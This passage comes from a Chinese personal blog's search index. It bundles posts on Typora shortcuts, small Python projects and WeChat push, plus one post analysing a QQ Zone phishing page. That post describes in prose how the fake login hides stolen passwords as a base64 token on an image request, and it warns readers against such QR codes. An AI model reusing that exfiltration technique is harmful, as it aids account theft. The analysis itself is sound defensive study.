$$</code></p><p>$$<br>\lim_{x\to +\infty} \frac{1}{x}=0<br>$$<br>加个框试试（<code>\boxed{}</code>）：<br>$$<br>\boxed{ \overrightarrow{AB}}<br>$$</p><blockquote><p>这是行内公式 $ \sqrt[3]{test} $ ，妙啊~</p></blockquote><p>具体的还得慢慢看呢。</p><p>顺便学一波<code>LaTex</code>也挺不错的~</p><h2 id="插入目录"><a href="#插入目录" class="headerlink" title="插入目录"></a><strong>插入目录</strong></h2><p><code>[toc]  + ENTER</code></p><blockquote><p>就是最上面那个啦~</p></blockquote><hr><h2 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a><strong>新建文件</strong></h2><p><code>ctrl + N</code>    </p><h2 id="选中中文-英文"><a href="#选中中文-英文" class="headerlink" title="选中中文/英文"></a><strong>选中中文/英文</strong></h2><p><code>ctrl + D</code></p><p>miao miao~ </p><p><code>ctrl + Shift + 左/右</code> 快速选中整个词语/单词。</p><h2 id="选中整行"><a href="#选中整行" class="headerlink" title="选中整行"></a><strong>选中整行</strong></h2><p><code>ctrl + L</code></p><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a><strong>查找</strong></h2><p><code>ctrl + F</code></p><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a><strong>替换</strong></h2><p><code>ctrl + H</code></p><h2 id="跳转到开头-结尾"><a href="#跳转到开头-结尾" class="headerlink" title="跳转到开头/结尾"></a><strong>跳转到开头/结尾</strong></h2><p><code>ctrl + HOME</code> 跳转至文章开头</p><p><code>ctrl + END</code>   跳转至文章末尾</p><h2 id="打开文件（笔记）"><a href="#打开文件（笔记）" class="headerlink" title="打开文件（笔记）"></a><strong>打开文件（笔记）</strong></h2><p><code>ctrl + P</code></p><h2 id="全屏显示"><a href="#全屏显示" class="headerlink" title="全屏显示"></a><strong>全屏显示</strong></h2><p><code>F11</code></p><h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a><strong>侧边栏</strong></h2><p><code>ctrl + shift + L</code></p><h2 id="清除格式"><a href="#清除格式" class="headerlink" title="清除格式"></a><strong>清除格式</strong></h2><p><code>ctrl + \</code></p><h2 id="切换到代码模式"><a href="#切换到代码模式" class="headerlink" title="切换到代码模式"></a><strong>切换到代码模式</strong></h2><p><code>ctrl + /</code></p><p><strong><em>==etc.==</em></strong></p><p>还有挺多还要慢慢去发掘呢~</p><hr><p>顺便说一下</p><p><code>Snipaste</code> 这个截图工具挺强大的</p><p><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">官网</a> <a href="https://zh.snipaste.com/" target="_blank" rel="noopener">https://zh.snipaste.com/</a></p><blockquote><p>本文搬运自我的csdn博客啦~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统</title>
      <link href="/2019/08/18/Park_at_ease/"/>
      <url>/2019/08/18/Park_at_ease/</url>
      
        <content type="html"><![CDATA[<h1 id="Park-at-ease"><a href="#Park-at-ease" class="headerlink" title="Park at ease"></a>Park at ease</h1><p><strong>停车场管理系统</strong><br><em>基于Python实现</em>  </p><p><strong>Park Management System</strong><br><em>Based on Python…</em>    </p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello, this is Park_at_ease!'</span><span class="token punctuation">)</span></code></pre><p><img src="/2019/08/18/Park_at_ease/20190818195449125.png" alt="运行界面"></p><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p>这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。  </p><p>原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。<br>这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！  </p><p><em>PS:原则上不提供技术支持哈。</em></p><hr><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p>欢迎大家在此基础上继续完善鸭~<br><strong>欢迎Star、Fork、提PR &amp; issue！</strong></p><p><strong>使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！</strong>  </p><hr><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2> <a id="more"></a> <p>这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。<br>这里直接就截屏放出来吧，PDF还有别的内容懒得改了。<br>如果有什么建议<strong>欢迎在GitHub上提issue</strong>或者<strong>在这里评论</strong>哈~！  </p><p><img src="/2019/08/18/Park_at_ease/20190818165341354.png" alt="20190818165341354">  </p><p><img src="/2019/08/18/Park_at_ease/20190818165453514.png" alt="20190818165453514"></p><p><img src="/2019/08/18/Park_at_ease/20190818165508495.png" alt="20190818165508495"></p><p><img src="/2019/08/18/Park_at_ease/20190818165517893.png" alt="20190818165517893"></p><p><img src="/2019/08/18/Park_at_ease/20190818165530183.png" alt="20190818165530183"></p><p><img src="/2019/08/18/Park_at_ease/20190818165538685.png" alt="20190818165538685"></p><p><img src="/2019/08/18/Park_at_ease/20190818165548553.png" alt="20190818165548553"></p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked disabled type="checkbox"> 管理员界面 Administrator Interface  </li><li><input checked disabled type="checkbox"> 文件操作 FileIO</li><li><input checked disabled type="checkbox"> 登录界面 Login  </li><li><input disabled type="checkbox"> 登录加密 Login Encryption</li><li><input disabled type="checkbox"> 图形界面 GUI  </li><li><input disabled type="checkbox"> 多线程或多进程 Multithreading or Multiprocessing  </li><li><input disabled type="checkbox"> 邮件推送 Email Push  </li><li><input disabled type="checkbox"> 微信推送 WeChat Push  </li><li><input disabled type="checkbox"> TCP  </li><li><input disabled type="checkbox"> 嵌入式开发 Embedded Development<br>  etc.  </li></ul><hr><p><strong>具体请移步到GitHub鸭！</strong></p><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p><img src="/2019/08/18/Park_at_ease/20190818195154540.png" alt="喵~"></p><p>溜了溜了<br>下次再见啦~</p><blockquote><p>搬运自我的csdn博客啦~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于模拟点击实现数据自动测量</title>
      <link href="/2019/07/10/Idea_AutoMeasure/"/>
      <url>/2019/07/10/Idea_AutoMeasure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运一篇之前写的小想法啦~</p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>人工智能——先人工后智能<br>哪里有现成数据给你<br>还不是人工手动去测……  </p><p>大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。<br>就是这个也太枯燥了8，效率还低。<br>不如py一下写个自动执行的！<br>说写就写呗<em>（斜眼笑.gif)</em>  </p><h2 id="初代版本"><a href="#初代版本" class="headerlink" title="初代版本"></a>初代版本</h2><p>发现Python有个现成的第三方库叫<code>PyAutoGui</code>库，它给的函数还是挺方便的。<br>按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。  </p><p>总之还是挺不错的吧<br>输入<strong>角度、次数、开始index</strong>（程序崩的时候备用），<br>然后就可以自动开始测量，新建文件夹，按顺序命名保存。  </p><p><img src="/2019/07/10/Idea_AutoMeasure/code.png" alt="code1"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code2.png" alt="code2"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code3.png" alt="code3"></p><p>理论一天可测的数据量从270组提高到435组，<strong>效率提升了61%吧！</strong>  </p><p>还要感谢潇潇弟弟陪我debug 嘻嘻嘻~  </p><hr><h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><blockquote><p><em>Update on 20190725.</em></p></blockquote><p>之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。</p><p>由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。</p><p>于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！  </p><p>另外还加入了log，记录日志文件方便检查错误。</p><p>嘿嘿嘿~</p><p><img src="/2019/07/10/Idea_AutoMeasure/update1.png" alt="update"></p><p><img src="/2019/07/10/Idea_AutoMeasure/update2.png" alt="运行界面"></p><p><img src="/2019/07/10/Idea_AutoMeasure/log.png" alt="log"></p>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 模拟点击 </tag>
            
            <tag> 大创 </tag>
            
            <tag> 自动 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇 随便写写</title>
      <link href="/2019/07/09/FirstBlog/"/>
      <url>/2019/07/09/FirstBlog/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>搬运自我的CSDN博客 </p></blockquote><p>这篇可以算是第一次公开发出来的吧<br><em>（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233</em></p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, everyone!"</span><span class="token punctuation">)</span></code></pre><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>  上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是<em>EE</em>和<em>CS</em>方向的。</p><p>这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。</p><p>大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。</p><p>其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 </p><p>登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。</p><hr><h2 id="When"><a href="#When" class="headerlink" title="When?"></a>When?</h2><p>其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……<br>当然，<strong>有想法</strong> &amp;&amp; <strong>有空</strong> 的时候，就来这儿写点东西吧！</p><hr><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><p>其实我感兴趣的东西挺多的 emmm<br>比如说大体说一说嘛：</p><ul><li><h4 id="嵌入式相关"><a href="#嵌入式相关" class="headerlink" title="嵌入式相关"></a>嵌入式相关</h4><ul><li>MCU单片机</li><li>FPGA</li><li>物联网 IoT<ul><li>ESP8266<br>（准备好好研究一波，可以单独列一列）</li></ul></li></ul></li><li><h4 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h4><ul><li>Python 以及各种库</li><li>MATLAB  </li></ul></li><li><h4 id="人工智能-AI"><a href="#人工智能-AI" class="headerlink" title="人工智能 AI"></a>人工智能 AI</h4><ul><li>机器学习 Machine Learning，ML </li></ul></li><li><h4 id="计算机视觉-Computer-Vision，CV"><a href="#计算机视觉-Computer-Vision，CV" class="headerlink" title="计算机视觉 Computer Vision，CV"></a>计算机视觉 Computer Vision，CV</h4></li><li><h4 id="数据分析与挖掘"><a href="#数据分析与挖掘" class="headerlink" title="数据分析与挖掘"></a>数据分析与挖掘</h4><ul><li>数据获取（如爬虫虫）</li><li>数据可视化</li></ul></li><li><p>数据挖掘</p></li><li><h4 id="微信小程序开发"><a href="#微信小程序开发" class="headerlink" title="微信小程序开发"></a>微信小程序开发</h4></li><li><h4 id="前端尝个鲜"><a href="#前端尝个鲜" class="headerlink" title="前端尝个鲜"></a>前端尝个鲜</h4></li><li><h4 id="视频制作"><a href="#视频制作" class="headerlink" title="视频制作"></a>视频制作</h4></li><li><p>etc.</p></li></ul><p>其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。<br>于是乎就<strong>想写啥就写啥</strong>呗。<br>不过基本上以小想法为主，就是随便记录一下这样吧。  </p><hr><p><strong>好啦第一篇就这样随便写写了。<br>溜啦溜啦~</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日常生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 日常生活 </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 某QQ空间盗号页面分析</title>
      <link href="/2019/03/30/Idea_AnalysisOfHackingPage/"/>
      <url>/2019/03/30/Idea_AnalysisOfHackingPage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/1.jpg" alt="1"></p><p>然后感觉不对劲，肯定是被盗号了。  </p><p>然后突然有个脑洞，去看看这里面有啥吧  </p><h2 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h2><p>用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似<code>url.cn/...</code>的短链接。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/2.jpg" alt="2"></p><p>用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/3.png" alt="3"></p><p>于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/4.png" alt="4"></p><p>感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/5.png" alt="5"></p><p>点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/6.png" alt="6"></p><p>乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/7.png" alt="7"></p><p>而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9）</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/8.png" alt="8"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/9.png" alt="9"></p><p>顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。</p><hr><p>jio得还没完，这token咋来的，提交的<strong>账号密码去哪了</strong>emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/10.png" alt="10"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/11.png" alt="11"></p><p>哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/12.png" alt="12">  </p><p><em>// 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢</em>  </p><hr><p>到这差不多了，但感觉还没完，我们再来<strong>查查这个域名</strong>吧。</p><p>P13-15注册者信息，这人注册的域名真多。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/13.png" alt="13">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/14.png" alt="14">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/15.png" alt="15"></p><p>用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/16.png" alt="16"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是个做得有点水平的钓鱼网站。</p><p><strong>碰到类似的二维码别乱扫，扫了也别登录！</strong></p><p>至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/17.jpg" alt="又开始了"></p><p>以上内容均基于公开资料，<strong>仅供学习研究使用，请勿用于非法用途</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> QQ空间 </tag>
            
            <tag> 盗号 </tag>
            
            <tag> 分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用python-docx批量提取Word中的信息进而导入Excel</title>
      <link href="/2019/03/21/Idea_python-docx/"/>
      <url>/2019/03/21/Idea_python-docx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><p>又是个小脑洞<br>最近有个比赛要统计一下各组信息，信息来自Word版的申请表。</p><p><img src="/2019/03/21/Idea_python-docx/1.jpg" alt="1"></p><p>考虑到Word要一个一个打开，再复制粘贴。</p><p>简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。  </p><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。</p><p>而后发现有个<strong>第三方库<code>python-docx</code></strong>，于是乎不想造轮子了，直接拿来用吧。</p><p>然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。</p><h2 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h2><p>文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。</p><h2 id="批量读取"><a href="#批量读取" class="headerlink" title="批量读取"></a>批量读取</h2><p>遍历文件夹下所有文件，筛选<code>.docx</code>且排除临时文件，噫少了俩。</p><p>原来还有.doc格式的，另存为.docx <em>(docx库只支持.docx)</em>。</p><p>依次读取每个文件，拼接string列表，得到所需信息。</p><p><img src="/2019/03/21/Idea_python-docx/2.jpg" alt="2"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>将infolist按照<code>.csv</code>的格式写入文件。</p><blockquote><p>其实可以调用第三方库来实现的。</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！  </p><p><strong>生产环境真复杂</strong>  </p><p><img src="/2019/03/21/Idea_python-docx/3.jpg" alt="遇到的情况">  </p><p><img src="/2019/03/21/Idea_python-docx/4.jpg" alt="4">  </p><p>如果用Excel打开<code>.csv</code>，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养  </p><p>又查了查资料，新建<code>.xlsx</code>，从文本导入到Excel，设置好属性。  </p><p>几好，完事！</p><p><img src="/2019/03/21/Idea_python-docx/5.jpg" alt="修正后的匹配代码">  </p><p><img src="/2019/03/21/Idea_python-docx/6.jpg" alt="最终得到的Excel">  </p><blockquote><p>于是乎边查资料边debug边改代码 花了一个多两个小时<br>估计几个人同时手动做早都做完了  </p></blockquote><p>（其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧</p>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> docx </tag>
            
            <tag> word </tag>
            
            <tag> csv </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于PushBear API实现微信消息推送</title>
      <link href="/2019/03/07/Idea_PushBearAPI_WeChatPush/"/>
      <url>/2019/03/07/Idea_PushBearAPI_WeChatPush/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小想法啦~  </p></blockquote><h2 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h2><p>基于PushBear API实现微信消息提醒  </p><p><a href="http://pushbear.ftqq.com/admin/#/" target="_blank" rel="noopener">PushBear API</a></p><p>用requests里现成的方法就完事了。  </p><h2 id="tkinter-GUI"><a href="#tkinter-GUI" class="headerlink" title="tkinter GUI"></a>tkinter GUI</h2><p>就是直接写代码感觉有点不友好</p><p>于是想做个图形界面</p><p>基于Python GUI库tkinter简单做了一下<br><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/1.jpg" alt="code">  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/GUI.png" alt="GUI"></p><blockquote><p>（代码手动写布局太难受了<br>（还是直接用代码POST/GET方便emmm<br><em>（突然jio得LabVIEW做图形界面真方便</em></p></blockquote><h2 id="微信推送效果"><a href="#微信推送效果" class="headerlink" title="微信推送效果"></a>微信推送效果</h2><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/push.jpg" alt="推送效果"></p><p><strong>打开后是<code>Markdown</code>渲染的效果呢！</strong>  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/2.jpg" alt="Markdown"></p><p>   （完）  </p><blockquote><p>20191221 Update：  </p><p>好久没用了不知道现在还能不能用了233</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> API </tag>
            
            <tag> 微信 </tag>
            
            <tag> 消息推送 </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
